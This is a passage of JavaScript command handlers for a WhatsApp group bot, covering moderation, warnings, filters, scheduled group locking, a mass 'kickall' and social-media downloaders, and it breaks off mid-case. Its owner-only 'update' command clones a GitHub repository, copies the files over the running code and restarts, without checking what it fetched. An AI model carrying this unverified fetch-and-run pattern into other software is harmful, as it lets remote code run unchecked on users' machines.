if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!setsudo.includes(orang)) return m.reply(`_User ${orang.split('@')[0]} not founded as a sudo before_`)
let indx = setsudo.indexOf(orang)
await setsudo.splice(indx, 1)
await fs.writeFileSync("./all/database/owner.json", JSON.stringify(setsudo))
m.reply(`_succesfully deleted ${orang.split('@')[0]} from sudo number_`)
} else {
return m.reply(example("@tag/234XXX/reply to chat"))
}}
break

case "listsudo": case "getsudo": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (setsudo.length < 1) return m.reply("No sudo Number yet in Pixel")
let teksnya = `Sudo Number here\n`
setsudo.forEach(e => teksnya += `* @${e.split("@")[0]}\n`)
await donwiz.sendMessage(m.chat, {text: teksnya, mentions: [... setsudo]}, {quoted: m})
}
break

case 'request':{
				if (!m.isGroup) return m.reply(msg.group);
				if (!isBotAdmins) return m.reply(msg.botAdmin);
				if (!isAdmins) return m.reply(msg.admin);
				const response = await donwiz.groupRequestParticipantsList(m.chat);
				if (!response || !response.length) {
					donwiz.sendMessage(m.chat, {text: 'No pending join requests. '}, {quoted:m});
					return;
				}
				let replyMessage = `Join Request List:\n`;
				response.forEach((request, index) => {
					const { jid, request_method, request_time } = request;
					const formattedTime = new Date(parseInt(request_time) * 1000).toLocaleString();
					replyMessage += `\n*No.: ${index + 1} Request Details. *`;
					replyMessage += `\n*JID:* ${jid}`;
					replyMessage += `\n*Method:* ${request_method}`;
					replyMessage += `\n*Time:* ${formattedTime}\n`;
				});
				donwiz.sendMessage(m.chat, {text: replyMessage}, {quoted:m});
			};
			break

case 'accept': {
if (m.isGroup) {
  if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
try {
       if (!m.isGroup) return m.reply(msg.group)
	 if (!isBotAdmins) return await m.reply(msg.botAdmin)
     if (!isAdmins) return message.reply(msg.admin)
     const total = await donwiz.groupRequestParticipantsList(m.chat);
     if (!total || !total[0]) {
       return await m.reply("No pending participant Yet");
     }
     let reqs2 = [];
     let mssg = "Accepted user\n\n";
     for (let i = 0; i < total.length; i++) {
       try {
         await donwiz.groupRequestParticipantsUpdate(m.chat, [total[i].jid], "approve");
         mssg += "@" + total[i].jid.split("@")[0] + "\n";
         reqs2 = [...reqs2, total[i].jid];
       } catch {}
     }
    await donwiz.sendMessage(m.chat, {
       text: mssg,
       mentions: [reqs2]
     });
   } catch (err) {
     await m.reply(err.toString());
   }
   }
 break
 
case "kickall": case "flingall": {
if (m.isGroup) {
  if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isBotAdmins) return m.reply(msg.botAdmin)
if (!isAdmins) return m.reply(msg.admin)
let users = participants.filter((u) => !areJidsSameUser(u.id, donwiz.user.id)); 
   let kickedUser = []; 
   for (let user of users) { 
     if (user.id.endsWith("@s.whatsapp.net") && !user.admin) { 
       await kickedUser.push(user.id); 
       await sleep(1 * 1000); 
     } 
   } 
   if (!kickedUser.length >= 1) 
     return m.reply("In this group there are no members except you and me"); 
   const res = await donwiz.groupParticipantsUpdate(m.chat, kickedUser, "remove"); 
   await sleep(3000); 
   await m.reply( 
     `sucessfully kicked \n${kickedUser.map( 
       (v) => "@" + v.split("@")[0] 
     )}`, 
     null, 
     { 
       mentions: kickedUser, 
     } 
   ); 
}
break

case 'mode': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (args[0] === 'public') {
if (global.db.settings.mode === false) {
m.reply('Bot mode is already set to Public!')
} else {
global.db.settings.mode = false
m.reply('Bot mode changed to Public!')
}
} else if (args[0] === 'private') {
if (global.db.settings.mode  === true) {
m.reply('Bot mode is already set to Private!')
} else {
global.db.settings.mode = true
m.reply('Bot mode changed to Private!')
}
} else if (args[0] === 'group') {
if (global.db.settings.onlygroup) {
m.reply('already activated!')
} else {
global.db.settings.onlygroup = true
global.db.settings.onlypc = false
m.reply('Only group mode activated!')
}
} else if (args[0] === 'pc') {
if (global.db.settings.onlypc) {
m.reply('already activated!')
} else {
global.db.settings.onlypc = true
global.db.settings.onlygroup = false
m.reply('Only pc mode activated!')
}
} else if (args[0] === 'off') {
global.db.settings.onlypc = false
global.db.settings.onlygroup = false
await m.reply('Succesfully deactivated only pc/ only group')
} else {
m.reply(example('public/private/group/pc/off'))
}
}
break

case 'update': {
  if (args[0] === 'now') {
        if (m.isGroup) {
            if (global.db.groups[m.chat].banned) return;
        }
        if (global.db.users[m.sender].banned) return m.reply(msg.ban);
        if (!isOwner) return m.reply(msg.owner);
        
        m.reply(`_Updating Pixel-md..._`);
        
        try {
            const { exec } = require('child_process');
            const fs = require('fs');
            const githubRepo = "https://github.com/Ednut001/arch-md.git";
            
            if (!fs.existsSync("./arch-md")) {
                exec(`git clone ${githubRepo} Pixel-md`, (err, stdout, stderr) => {
                    if (err) {
                        console.error(stderr);
                        return m.reply("_Failed to clone repository._");
                    }
                    updateFiles();
                });
            } else {
                m.reply("_Fetching latest updates.._.");
                exec(`cd Pixel-md && git pull`, (err, stdout, stderr) => {
                    if (err) {
                        console.error(stderr);
                        return m.reply("_Failed to fetch updates._");
                    }
                    if (stdout.includes("Already up to date.")) {
                        m.reply("_Bot up to date._");
                    } else {
                        updateFiles();
                    }
                });
            }
            
            function updateFiles() {
                exec(`cp -r Pixel-md/* ./`, (err, stdout, stderr) => {
                    if (err) {
                        console.error(stderr);
                        return m.reply("Failed to update files.");
                    }
                    m.reply("_Pixel-md update done. Restarting.. to take effect_.");
                    setTimeout(() => {
                        process.exit(0);
                    }, 1000);
                });
            }
        } catch (error) {
            console.error("Unexpected Error:", error);
            m.reply("An unexpected error occurred.");
        }
  } else {
    try {
      const url = `https://api.github.com/repos/Ednut001/arch-md/commits?sha=main&per_page=5`;
      const response = await fetch(url, {
        headers: { 'User-Agent': 'Pixel-md/1.0' }
      });
      const data = await response.json();
      const { exec } = require('child_process');
      exec(`git pull`, (err, stdout, stderr) => {
        if (err) {
          let message = "_Recent commits:_\n\n";
          data.forEach((commit, index) => {
            message += `${index + 1}. ${commit.commit.message}\n`;
          });
          message += "\n_Use *update now* to update the bot._";
          m.reply(message);
        } else if (stdout.includes("Already up to date.")) {
          let message = "_No available updates yet. Bot is fully up to date on the current version._\n\n";
          message += "_Recent commits:_\n\n";
          data.forEach((commit, index) => {
            message += `${index + 1}. ${commit.commit.message}\n`;
          });
          m.reply(message);
        } else {
          let message = "_New update available. Recent commits:_\n\n";
          data.forEach((commit, index) => {
            message += `${index + 1}. ${commit.commit.message}\n`;
          });
          message += "\n_Use *update now* to update the bot._";
          m.reply(message);
        }
      });
    } catch (error) {
      m.reply("_Error checking updates._");
      console.error(error);
    }
  }
  break;
}

case 'demote': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
if (!m.quoted && !text) return m.reply(example("tag/reply chat"))
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
const groupMetadata = await donwiz.groupMetadata(m.chat)
const groupAdmins = groupMetadata.participants.filter(p => p.admin).map(p => p.id)
if (!groupAdmins.includes(users)) return m.reply(`@${users.split('@')[0]} is not an admin in this group.`)
await donwiz.groupParticipantsUpdate(m.chat, [users], 'demote')
await m.reply(`@${users.split('@')[0]} has been dismissed as an administrator in ${groupMetadata.subject}`)
}
break

case 'promote': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
if (!m.quoted && !text) return m.reply(example("tag/reply chat"))
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
const groupMetadata = await donwiz.groupMetadata(m.chat)
const groupAdmins = groupMetadata.participants.filter(p => p.admin).map(p => p.id)
if (groupAdmins.includes(users)) return m.reply(`@${users.split('@')[0]} is already an admin in this group.`)
await donwiz.groupParticipantsUpdate(m.chat, [users], 'promote')
await m.reply(`@${users.split('@')[0]} has been promoted to an administrator in ${groupMetadata.subject}`)
}
break


case "tag": case "hidetag": case "ht": {
  if (m.isGroup) {
    if (global.db.groups[m.chat].banned) return
  }
  if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!m.isGroup) return m.reply(msg.group)
  if (!(isAdmins || isOwner)) return m.reply(msg.admin)
  const metadata = await donwiz.groupMetadata(m.chat)
  let member = await metadata.participants.map(e => e.id)

  let q = m.msg.contextInfo ? m.msg.contextInfo.quotedMessage : null;
  let text = m.text.replace(/,(tag|hidetag|ht)/i, '').trim() || m.msg.conversation;

  if (q) {
    if (q.imageMessage) {
      let imageUrl = await donwiz.downloadAndSaveMediaMessage(q.imageMessage);
      donwiz.sendMessage(m.chat, { image: { url: imageUrl }, caption: q.imageMessage.caption, mentions: [...member] });
    } else if (q.videoMessage) {
      let videoUrl = await donwiz.downloadAndSaveMediaMessage(q.videoMessage);
      donwiz.sendMessage(m.chat, { video: { url: videoUrl }, caption: q.videoMessage.caption, mentions: [...member] });
    } else if (q.audioMessage) {
      let audioUrl = await donwiz.downloadAndSaveMediaMessage(q.audioMessage);
      donwiz.sendMessage(m.chat, {audio: {url: audioUrl}, mimetype: "audio/mpeg", mentions: [...member]});
    } else {
      donwiz.sendMessage(m.chat, { text: q.conversation, mentions: [...member] });
    }
  } else {
    donwiz.sendMessage(m.chat, { text, mentions: [...member] });
  }
  break
}

case 'tagadmin': case 'listadmin': case 'admin':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
const groupMetadata = await donwiz.groupMetadata(m.chat)
const groupAdmins = groupMetadata.participants.filter(p => p.admin)
const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
let text = `Group Admin\n${listAdmin}`.trim()
await donwiz.sendMessage(m.chat, {text, mentions: groupAdmins.map(v => v.id) }, {quoted: m})
} 
break

case 'filter': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
  const args = m.text.split('"');
  if (args.length < 4) return m.reply(example('"trigger" "response"'));

  const trigger = args[1].toLowerCase();
  const response = args[3];

  if (!global.db.pfilters) global.db.pfilters = {};
  if (!global.db.pfilters) global.db.pfilters = {};

  global.db.pfilters[trigger] = response;
  m.reply(`Filter added: ${trigger} -> ${response}`);
  
if (!isMessage && m.isGroup) return;
if (m.key.fromMe && isCmd2) return;
const messageContent = isMessage.toLowerCase();
const chatId = m.key.remoteJid;

for (const trigger in global.db.pfilters || {}) {
  if (messageContent.startsWith(trigger.toLowerCase())) {
    const response = global.db.pfilters[trigger];
    await donwiz.sendMessage(chatId, { text: response }, { quoted: m });
    return;
  }
}
}
break;

case 'listfilter': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
  if (!global.db.pfilters || !global.db.pfilters) return m.reply('No filters set');

  const filters = Object.keys(global.db.pfilters).map((trigger) => `${trigger} -> ${global.db.pfilters[trigger]}`).join('\n');
  m.reply(`Filters:\n${filters}`);
}
break;

case 'delfilter': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
  const args = m.text.split('"');
  if (args.length < 2) return m.reply(example('"trigger"'));

  const trigger = args[1].toLowerCase();

  if (!global.db.pfilters || !global.db.pfilters || !global.db.pfilters[trigger]) return m.reply('Filter not found');

  delete global.db.pfilters[trigger];
  m.reply(`Filter removed: ${trigger}`);
}
break;


case 'antilink': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
if (!text) return m.reply(example('<kick/delete/warn> or antilink off'))
const action = text
if (action === 'kick') {
if (global.db.groups[m.chat].antilink) return m.reply('Already activated in this group')
global.db.groups[m.chat].antilink = true
global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink3 = false
await m.reply('Succesfully activated antilink to kick any link sender')
} else if (action === 'delete') {
if (global.db.groups[m.chat].antilink2) return m.reply('Already activated in this group')
global.db.groups[m.chat].antilink2 = true
global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink3 = false
await m.reply('Succesfully activated antilink to delete any sent link')
} else if (action === 'warn') {
if (global.db.groups[m.chat].antilink3) return m.reply('Already activated in this group')
global.db.groups[m.chat].antilink3 = true
global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink = false
await m.reply('Succesfully activated antilink to warn and delete any sent link')
} else if (action === 'off') {
global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink3 = false
await m.reply('Succesfully deactivated antilink feature in this group')
} else {
m.reply('Invalid action the actions are warn/kick/delete!')
}
} 
break

case 'antibot': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
if (args[0] === 'on') {
if (global.db.groups[m.chat].antibot === true) return m.reply('Antibot already enabled!')
global.db.groups[m.chat].antibot = true
m.reply('Antibot enabled in the group!')
} else if (args[0] === 'off') {
if (global.db.groups[m.chat].antibot === false) return m.reply('Antibot already disabled!')
global.db.groups[m.chat].antibot = false
m.reply('Auto bio disabled in the group!')
} else {
m.reply(example('on/off'))
}
}
break;

case 'closetime': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
if (args.length < 1) return m.reply(example("23:30"))
if (typeof args[0] !== 'string' || !args[0].includes(':')) return m.reply('Invalid time format!')
let time = args[0].split(':')
let hour = time[0]
let minute = time[1]
if (hour > 23 || minute > 59) return m.reply('Invalid time format!')
let closeTime = `${hour}:${minute}`
console.log(`Close time: ${closeTime}`)
if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
global.db.groups[m.chat].muteTime = closeTime
global.db.groups[m.chat].mute = true
await m.reply(`Close Time set to ${args[0]} everyday. Group will auto-lock at this time.`)
setInterval(async () => {
let currentTime = moment().tz(`${global.timezone}`).format('HH:mm')
if (currentTime === closeTime) {
try {
await donwiz.groupSettingUpdate(m.chat, 'announcement')
console.log(`Group settings updated successfully`)
} catch (error) {
console.error(`Error updating group settings: ${error}`)
}
}
}, 60000) // check every 1 minute
}
break

case 'opentime': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
if (args.length < 1) return m.reply(example("08:00"))
if (typeof args[0] !== 'string' || !args[0].includes(':')) return m.reply('Invalid time format!')
let time = args[0].split(':')
let hour = time[0]
let minute = time[1]
if (hour > 23 || minute > 59) return m.reply('Invalid time format!')
let openTime = `${hour}:${minute}`
console.log(`Open time: ${openTime}`)
if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
global.db.groups[m.chat].openTime = openTime
global.db.groups[m.chat].open = true
await m.reply(`Open Time set to ${args[0]} everyday. Group will auto-open at this time.`)
setInterval(async () => {
let currentTime = moment().tz(`${global.timezone}`).format('HH:mm')
if (currentTime === openTime) {
try {
await donwiz.groupSettingUpdate(m.chat, 'not_announcement')
console.log(`Group settings updated successfully`)
} catch (error) {
console.error(`Error updating group settings: ${error}`)
}
}
}, 60000) // check every 1 minute
}
break

case 'stoptime': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {}
global.db.groups[m.chat].muteTime = null
global.db.groups[m.chat].mute = null
global.db.groups[m.chat].openTime = null
global.db.groups[m.chat].open = null
await m.reply(`Close Time and Open Time deleted successfully.`)
}
break

case "pdm": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!(isAdmins || isOwner)) return m.reply(msg.admin)
if (args.length < 1) return m.reply(example("on/off"))
if (args[0] === "on") {
if (global.db.groups[m.chat].events) return m.reply('Already on')
global.db.groups[m.chat].events = true
m.reply('pdm turned on successfully')
} else if (args[0] === "off") {
if (!global.db.groups[m.chat].events) return m.reply('Already off')
global.db.groups[m.chat].events = false
m.reply('pdm turned off successfully')
}
} 
break

case "welcome": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!(isAdmins || isOwner)) return m.reply(msg.admin)
if (args.length < 1) return m.reply(example("on/off"))
if (args[0] === "on") {
if (global.db.groups[m.chat].welcome) return m.reply('Already on')
global.db.groups[m.chat].welcome = true
m.reply('Welcome turned on successfully')
} else if (args[0] === "off") {
if (!global.db.groups[m.chat].welcome) return m.reply('Already off')
global.db.groups[m.chat].welcome = false
m.reply('Welcome turned off successfully')
}
} 
break

case 'setalive': {
  if (m.isGroup) {
    if (global.db.groups[m.chat].banned) return;
  }
  if (global.db.users[m.sender].banned) return m.reply(msg.ban);
  if (!isOwner) return m.reply(msg.owner);
  if (!args[0]) return m.reply(`Please provide a message with ${prefix}setalive #alive for runtime #ping for ping #quote for random quote add image or video url (alternative)`);
  
  global.db.settings.aliveTemplate = args.join(' ');
  const urlRegex = /(https?:\/\/[^\s]+)/;
  const urlMatch = global.db.settings.aliveTemplate.match(urlRegex);
  if (urlMatch) {
    const url = urlMatch[0];
    global.db.settings.aliveUrl = url;
    global.db.settings.aliveType = url.toLowerCase().endsWith('.mp4') ? 'video' : 'image';
    global.db.settings.aliveTemplate = global.db.settings.aliveTemplate.replace(url, '');
  } else {
    delete global.db.settings.aliveUrl;
    delete global.db.settings.aliveType;
  }
  m.reply('Alive message set!');
}
break;

case 'alive': {
  if (m.isGroup) {
    if (global.db.groups[m.chat].banned) return;
  }
  if (global.db.users[m.sender].banned) return m.reply(msg.ban);
  
  if (!global.db.settings.aliveTemplate) return m.reply('No alive message set! Use setalive to set one and get more info.');
  
  let timestamp = speed();
  let latensi = speed() - timestamp;
  const aliveMsg = global.db.settings.aliveTemplate
    .replace(/#alive/g, runtime(process.uptime()))
    .replace(/#ping/g, `${latensi.toFixed(4)} seconds`)
    .replace(/#quote/g, await getQuote());
  
  if (global.db.settings.aliveUrl) {
    donwiz.sendMessage(m.chat, {
      [global.db.settings.aliveType]: { url: global.db.settings.aliveUrl },
      caption: aliveMsg
    });
  } else {
    m.reply(aliveMsg);
  }
}
break;

case 'setwelcome':
  if (!m.isGroup) return m.reply(msg.group);
  if (global.db.users[m.sender].banned) return m.reply(msg.ban);
  if (m.isGroup) {
    if (global.db.groups[m.chat].banned) return;
  }
  if (!(isAdmins || isOwner)) return m.reply(msg.admin);
  if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {};
  let welcomeText = m.text.slice(prefix.length + 10).trim(); // Adjust slice length according to prefix
  if (!welcomeText) return m.reply(`Usage: ${prefix}setwelcome <message>\nExample: Hello @user for mention tag, welcome to #group! for group name #desc for description #time for time #date for date`);
  global.db.groups[m.chat].setwelcome = welcomeText;
  m.reply('Welcome message set successfully!');
  break;

case 'setgoodbye':
  if (!m.isGroup) return m.reply(msg.group);
  if (global.db.users[m.sender].banned) return m.reply(msg.ban);
  if (m.isGroup) {
    if (global.db.groups[m.chat].banned) return;
  }
  if (!(isAdmins || isOwner)) return m.reply(msg.admin);
  if (!global.db.groups[m.chat]) global.db.groups[m.chat] = {};
  let goodbyeText = m.text.slice(prefix.length + 10).trim(); // Adjust slice length according to prefix
  if (!goodbyeText) return m.reply(`Usage: ${prefix}setgoodbye <message>\nExample: Hello @user for mention tag, welcome to #group! for group name #desc for description #time for time #date for date!`);
  global.db.groups[m.chat].setgoodbye = goodbyeText;
  m.reply('Goodbye message set successfully!');
  break;
  
case "goodbye": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!(isAdmins || isOwner)) return m.reply(msg.admin)
if (args.length < 1) return m.reply(example("on/off"))
if (args[0] === "on") {
if (global.db.groups[m.chat].goodbye) return m.reply('Already on')
global.db.groups[m.chat].goodbye = true
m.reply('Goodbye turned on successfully')
} else if (args[0] === "off") {
if (!global.db.groups[m.chat].goodbye) return m.reply('Already off')
global.db.groups[m.chat].goodbye = false
m.reply('Goodbye turned off successfully')
}
} 
break

case 'igdl': 
case 'instagram': 
case 'ig': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
  if (!text) return m.reply(example(`input ig link`))
  if (!(text.includes('instagram.com') || text.includes('instagr.am') || text.includes('igtv'))) {
    return m.reply('Input a valid Instagram link!')
  }
  try {
    const result = await igdl(text)
    if (!result || result.length === 0) {
      return m.reply('Failed to get video. Make sure the URL entered is correct.')
    }
    for (let video of result) {
      await donwiz.sendFile(m.chat, video.url, 'instagram.mp4', '© 𝓢𝓾𝓬𝓮𝓼𝓼 𝓫𝔂 𝓟𝓲𝔁𝓮𝓵 𝔀𝓪 𝓫𝓸𝓽', m)
    }
  } catch (err) {
    console.error(err)
    m.reply('An error occurred while trying to download the video.')
  }
} 
break

case "facebook": case "fb": case "fbdl": case "fbvideo": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example("facebook media link"))
if (!(text.includes('facebook.com') || text.includes('fb.watch'))) {
return m.reply('Input a valid Facebook link!')
}
try {
let apiUrl = `https://api.agatz.xyz/api/facebook?url=${encodeURIComponent(text)}`
let res = await fetch(apiUrl);
if (!res.ok) throw 'Failed to fetch data from API';
let json = await res.json();
console.log('API Response:', json);
if (json.status !== 200) throw 'There is an error ' + json.creator;
let { url, hd, title, thumbnail } = json.data;
await donwiz.sendMessage(m.chat, { video: { url: hd }, caption: `*title:* ${title}\n*Thumbnail:* ${thumbnail}\n*Link:* ${url}\n\n© 𝓢𝓾𝓬𝓮𝓼𝓼 𝓫𝔂 𝓟𝓲𝔁𝓮𝓵 𝔀𝓪 𝓫𝓸𝓽` }, { quoted: m });
} catch (error) {
console.error(error);
m.reply(`error`);
}
};
break

case "tiktok": case "tt": case "ttdl": case "tiktokdl": {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!text) return m.reply(example('tiktok media link'))
let anuan = text
if (!(text.includes('tiktok.com') || text.includes('vm.tiktok.com'))) {
return m.reply('Input a valid TikTok link!')
}
await api.tiktok(anuan).then(async (res) => {
var cap = `© 𝓢𝓾𝓬𝓮𝓼𝓼 𝓫𝔂 𝓟𝓲𝔁𝓮𝓵 𝔀𝓪 𝓫𝓸𝓽`
if (res.result.duration == 0) {
for (let a of res.result.images) {
await donwiz.sendMessage(m.chat, {image: {url: `${a}`}, caption: cap}, {quoted: m})
}
} else {
await donwiz.sendMessage(m.chat, {video: {url: res.result.play}, mimetype: "video/mp4", caption: cap}, {quoted: m})
}
}).catch(e => m.reply(`${e}`))
} 
break

case "warn":{
if (m.isGroup) {
  if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
let war = global.warn;    
    let who;
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : false;
    else who = m.chat;
    if (!who) return m.reply(example(`tag or reply to chat`));
    if (!(who in global.db.users)) return m.reply(`Users are missing from my database`);
    let name = donwiz.getName(m.sender);
    let warn = global.db.users[who].warn;
    if (warn < war) {
        global.db.users[who].warn += 1;
        m.reply(`
⚠️ *warning notice* ⚠️

▢ *Admin:* ${name}
▢ *user:* @${who.split`@`[0]}
▢ *Warning:* ${warn + 1}/${war} 
▢ *Time:* ${moment().format("MMMM Do YYYY, h:mm:ss A")}
▢ *Group:* ${groupMetadata.subject}
▢ *Warnings Left:* ${warnLimit - warn}
▢ *Reason:* ${text}`, null, { mentions: [who] }); 
        m.reply(`
⚠️ *WARNING* ⚠️


▢ *Warning:* ${warn + 1}/${war} 
If you receive a *${war}* Warning you will be automatically removed from the group`, who);
    } else if (warn == war) {
        global.db.users[who].warn = 0;
        m.reply(` The user exceeded the *${war}* warning and will be removed.`);
        await sleep(3000);
        await donwiz.groupParticipantsUpdate(m.chat, [who], 'remove');
        m.reply(`You were removed from group *${groupMetadata.subject}* because you have been warned *${war}* times.`, who);
    }
};
break;

case "delwarn":{
if (m.isGroup) {
  if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!m.isAdmin || isOwner) return m.reply(msg.admin)
if (!m.isBotAdmin) return m.reply(msg.botAdmin)
let who
if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : false
else who = m.chat
if (!who) return m.reply(example(`tag or reply to a chat`))
if (!(who in global.db.users)) return m.reply(`user not found in my database`)
let warn = global.db.users[who].warn
if (warn > 0) {
  global.db.users[who].warn -= 1
  m.reply(`⚠️ *Warning deletion* 
         ▢ warns: *-1 * 
         ▢ *Time:* ${moment().format("MMMM Do YYYY, h:mm:ss A")}
▢ *Group:* ${groupMetadata.subject}
▢ *Warnings Left:* ${warnLimit - warn}
▢ Total warns: *${warn - 1}*`)
  m.reply(`sucess ✨️,you now have *${warn - 1}*`, who)
} else if (warn == 0) {
  m.reply(' Users have no warnings')
}
};
break;

case 'resetwarn':{
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!m.isGroup) return m.reply(msg.group)
if (!isAdmins) return m.reply(msg.admin)
if (!isBotAdmins) return m.reply(msg.botAdmin)
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
if (!input) return m.reply('Tag or reply to the user you want to reset the warning for!')
let user = input
if (!global.db.users[user]) global.db.users[user] = {}
global.db.users[user].warn = 0
m.reply(`Warning count for ${user.replace('@s.whatsapp.net', '')} has been reset`)
}
break

case 'autoreact': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example('<all/cmd> or areact off'))
const action = text.toLowerCase()
if (action === 'cmd') {
if (global.db.settings.areact) return m.reply('Already activated')
global.db.settings.areact = true
global.db.settings.areact2 = false
await m.reply('Succesfully activated areact to bot command messages')
} else if (action === 'all') {
if (global.db.settings.areact2) return m.reply('Already activated')
global.db.settings.areact2 = true
global.db.settings.areact = false
await m.reply('Succesfully activated areact to all messages')
} else if (action === 'off') {
global.db.settings.areact = false
global.db.settings.areact2 = false
await m.reply('Succesfully deactivated areact feature')
} else {
m.reply('Invalid action! The actions are all/cmd or off')
}
} 
break

case 'anticall': {
if (m.isGroup) {
if (global.db.groups[m.chat].banned) return
}
if (global.db.users[m.sender].banned) return m.reply(msg.ban)
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example('<reject/block> or anticall off'))
const action = text.toLowerCase()
if (action === 'reject') {
if (global.db.settings.anticall) return m.reply('Already activated')
global.db.settings.anticall = true
global.db.settings.anticall2 = false
await m.reply('Succesfully activated anticall to reject incoming calls')
} else if (action === 'block') {
if (global.db.settings.anticall2) return m.reply('Already activated')
global.db.settings.anticall2 = true
global.db.settings.anticall = false
await m.reply('Succesfully activated anticall to block callers')
} else if (action === 'off') {
global.db.settings.anticall = false
global.db.settings.anticall2 = false
await m.reply('Succesfully deactivated anticall feature')
} else {
m.reply('Invalid action! The actions are reject/block or off')
}
} 
break

case "xvideodl": {
if (m.isGroup) {
